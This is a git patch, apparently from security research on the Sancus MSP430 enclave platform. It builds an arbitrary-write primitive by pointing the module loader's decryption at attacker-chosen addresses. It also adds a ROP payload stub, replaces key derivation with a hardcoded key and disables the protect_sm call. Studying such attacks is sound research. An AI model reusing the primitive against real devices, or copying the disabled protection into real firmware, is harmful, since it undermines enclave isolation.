@@ -1,0 +1,225 @@
+From 1cc93359438271cdec1d7112fc78a3e08ac17619 Mon Sep 17 00:00:00 2001
+From: [removed]
+Date: [removed]
+Subject: [PATCH 1/2] working on arbitrary write primitive for malicious SP
+
+---
+ crypttest_fpga/Makefile    |  7 +++++--
+ crypttest_fpga/asm.S       | 11 +++++++++++
+ crypttest_fpga/main.c      | 46 ++++++++++++++++++++++++++++++++++++++++++++--
+ crypttest_fpga/other.c     |  2 ++
+ crypttest_fpga/sm_loader.c | 32 +++++++++++++++++++++++++-------
+ 5 files changed, 87 insertions(+), 11 deletions(-)
+ create mode 100644 crypttest_fpga/asm.S
+
+diff --git a/crypttest_fpga/Makefile b/crypttest_fpga/Makefile
+index 77144c3..1b97643 100644
+--- a/crypttest_fpga/Makefile
++++ b/crypttest_fpga/Makefile
+@@ -6,7 +6,7 @@ STACK     = 256
+ VENDOR_ID = 1234
+ NODE_KEY  = deadbeefcafebabedeadbeefcafebabe
+ 
+-OBJS      = sm_loader.o ctest.o other.o main.o aes.o uart.o xtime.o
++OBJS      = sm_loader.o ctest.o other.o main.o aes.o uart.o xtime.o asm.o
+ CFLAGS    = -Wall -Werror 
+ 
+ 
+@@ -20,7 +20,7 @@ main-no-crypt.elf: main-no-mac.elf
+ 	sancus-hmac --key `sancus-hmac --vendor-key $(VENDOR_ID) --key $(NODE_KEY)` -o main-no-crypt.elf main-no-mac.elf
+ 
+ main-no-mac.elf: $(OBJS)
+-	sancus-ld --standalone --rom-size $(ROM) --ram-size $(RAM) --sm-stack-size $(STACK) -o main-no-mac.elf $(OBJS)
++	sancus-ld --verbose --standalone --rom-size $(ROM) --ram-size $(RAM) --sm-stack-size $(STACK) -o main-no-mac.elf $(OBJS)
+ 
+ xtime.o: xtime.c
+ 	msp430-gcc -D__MSP430F149__ $(CFLAGS) -Os -c -o $@ $<
+@@ -28,6 +28,9 @@ xtime.o: xtime.c
+ %.o: %.c
+ 	LD_LIBRARY_PATH=/usr/local/lib sancus-cc $(CFLAGS) -c -o $@ $<
+ 
++%.o: %.S
++	LD_LIBRARY_PATH=/usr/local/lib sancus-cc $(CFLAGS) -c -o $@ $<
++
+ clean:
+ 	rm -f $(OBJS)
+ 	rm -f main-no-mac.elf main-no-crypt.elf
+diff --git a/crypttest_fpga/asm.S b/crypttest_fpga/asm.S
+new file mode 100644
+index 0000000..4117fe8
+--- /dev/null
++++ b/crypttest_fpga/asm.S
+@@ -0,0 +1,11 @@
++    .section ".spm.crypt_attacker.text"
++    .align 2
++    /* should be multiple of block size (16B) */
++    .word 0x1100
++    .word 0x3322
++    .word 0x5544
++    .word 0x7766
++    .word 0x9988
++    .word 0xbbaa
++    .word 0xddcc
++    .word 0xffee
+diff --git a/crypttest_fpga/main.c b/crypttest_fpga/main.c
+index dd26315..125dd6e 100644
+--- a/crypttest_fpga/main.c
++++ b/crypttest_fpga/main.c
+@@ -29,6 +29,13 @@ void print_bytes(const char* bytes, size_t n)
+         printf("%02x", bytes[i] & 0xff);
+ }
+ 
++#define AES_BLOCK_SIZE 16
++char src_buf[AES_BLOCK_SIZE]  = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1};
++char dest_buf[AES_BLOCK_SIZE] = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1};
++
++extern char __spm_sm_loader_sp;
++
++extern char __spm_crypt_attacker_public_start_crypt;
+ 
+ int main()
+ {
+@@ -36,6 +43,7 @@ int main()
+     size_t pend;
+     size_t ret;
+     size_t i;
++    void *attacker_src, *attacker_dest;
+ 
+     // disable watchdog timer
+     WDTCTL = WDTPW | WDTHOLD;
+@@ -57,10 +65,44 @@ int main()
+     protect_sm(&sm_loader);
+     printf("done\n");
+ 
+-    printf("Loading/Decrypting ctest ... ");
++    attacker_src = &__spm_crypt_attacker_public_start_crypt; // src_buf;
++    attacker_dest = /*&__spm_sm_loader_sp - 12; //*/dest_buf;
++
++    printf("attacker_src is:  ");
++    print_bytes(attacker_src, AES_BLOCK_SIZE);
++    printf("\n");
++#if 1
++    printf("attacker_dest is: ");
++    print_bytes(attacker_dest, AES_BLOCK_SIZE);
++    printf("\n");
++#endif
++
++    printf("Loading/Decrypting ctest ... \n");
++
++    crypt_ctest.public_start_crypt = attacker_src;
++    crypt_ctest.public_end_crypt   = crypt_ctest.public_start_crypt + AES_BLOCK_SIZE;
++    crypt_ctest.public_start       = attacker_dest; //&__spm_sm_loader_sp; //
++    crypt_ctest.public_end         = crypt_ctest.public_start + AES_BLOCK_SIZE;
++    crypt_ctest.name               = "crypt_attacker";
++
++    printf("dest @%p\n", crypt_ctest.public_start);
++
++    printf("%s\n", crypt_ctest.name);
++    
+     ret = sm_loader_load(&crypt_ctest);
++
++    printf("attacker_src is:  ");
++    print_bytes(attacker_src, AES_BLOCK_SIZE);
++    printf("\n");
++#if 1
++    printf("attacker_dest is: ");
++    print_bytes(attacker_dest, AES_BLOCK_SIZE);
++    printf("\n");
++#endif
++
++
+     if (ret != 1) {
+-        printf("failed\n");
++        printf("failed: %d\n", ret);
+         return -1;
+     }
+     printf("done\n");
+diff --git a/crypttest_fpga/other.c b/crypttest_fpga/other.c
+index cc24cb5..9164159 100644
+--- a/crypttest_fpga/other.c
++++ b/crypttest_fpga/other.c
+@@ -2,6 +2,8 @@
+ 
+ DECLARE_SM(other, 0x1234);
+ 
++char SM_DATA("other") dummy[16];
++
+ size_t other_call_ctest(char *buffer, size_t n, char *mac)
+ {
+     size_t ret;
+diff --git a/crypttest_fpga/sm_loader.c b/crypttest_fpga/sm_loader.c
+index 685c762..98fc134 100644
+--- a/crypttest_fpga/sm_loader.c
++++ b/crypttest_fpga/sm_loader.c
+@@ -45,6 +45,15 @@ static int SM_FUNC("sm_loader") decrypt(const void *key, const void *iv,
+     return ret;
+ }
+ 
++void SM_FUNC("sm_loader") *loader_memcpy(void *dest, const void *src, size_t n);
++
++#include <stdio.h>
++
++void SM_FUNC("sm_loader") hello_world_attacker(void)
++{
++    puts("hi from attacker ROP payload :-)");
++    while(1);
++}
+ 
+ int sm_loader_load(struct SancusCryptModule *scm)
+ {
+@@ -57,36 +66,45 @@ int sm_loader_load(struct SancusCryptModule *scm)
+ 
+     // check boundaries
+     if (pend < pstart || pcend < pcstart)
+-        return 0;
++        return 2;
+ 
+     // check sizes
+     if ((pend - pstart) != (pcend - pcstart))
+-        return 0;
++        return 3;
+ 
+     // check if sizes are a multiple of the AES block size
+     if ((pend - pstart) % SM_LOADER_KEYLEN != 0)
+-        return 0;
++        return 4;
+ 
+     // get scm->name length
+     for (i = 0; scm->name[i] != '\0'; i++);
+ 
+     // derive decryption key
++#if 1
++    //TODO for some reaso scm->name doesnt work??
+     if (hmac_sign(key, scm->name, i) == 0)
+-        return 0;
++        return 5;
+ 
+     // derive the IV for CCM mode
+     if (hmac_sign(iv, key, SM_LOADER_KEYLEN) == 0)
+-        return 0;
++        return 6;
++#else
++    for (i = 0; i < SM_LOADER_KEYLEN; i++)
++    {
++        key[i] = 0xaa;
++        iv[i] = 0x00;
++    }
++#endif
+ 
+     // TODO: disable interrupts
+ 
+     // decrypt module and check integrity in CCM mode
+     if (decrypt(key, iv, scm->public_start_crypt,
+                 scm->public_start, pend - pstart) == 0)
+-        return 0;
++        return 7;
+ 
+     // protect the module (should prevent read access)
+-    ret = protect_sm((struct SancusModule *)scm);
++    ret = 9; //protect_sm((struct SancusModule *)scm);
+ 
+     // TODO: enable interrupts
+ 
+-- 
+2.7.4
+
